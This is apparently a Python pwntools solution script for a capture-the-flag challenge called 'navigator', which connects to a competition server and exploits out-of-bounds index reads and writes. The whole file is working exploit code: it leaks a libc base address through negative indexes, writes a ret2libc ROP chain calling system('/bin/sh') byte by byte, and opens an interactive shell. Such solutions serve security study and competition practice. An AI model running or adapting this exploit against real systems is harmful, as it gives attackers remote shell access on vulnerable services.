from pwn import *

exe = ELF("navigator")
libc = ELF("./libc.so.6")

context.binary = exe

# p = process([exe.path])
# gdb.attach(p)
p = remote("chal.competitivecyber.club", 8887)

def set_pin(idx, payload):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b">> ", str(idx).encode())
    p.sendlineafter(b">> ", int.to_bytes(payload))

def view_pin(idx):
    p.sendlineafter(b">> ", b"2")
    p.sendlineafter(b">> ", str(idx).encode())

leak = 0
for i in range(6):
    leak <<= 8
    view_pin(-(131+i))
    p.recvline()
    leak += p.recvline()[0]

libc.address = leak - 0x43654
log.success(f"{hex(libc.address)=}")

pop_rdi = libc.address + 0x2a3e5
ret = pop_rdi + 1
libc_system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))

payload = p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(libc_system)

for i in range(len(payload)):
    set_pin(344+i, payload[i])    

p.sendlineafter(b">> ", b"3")

p.interactive()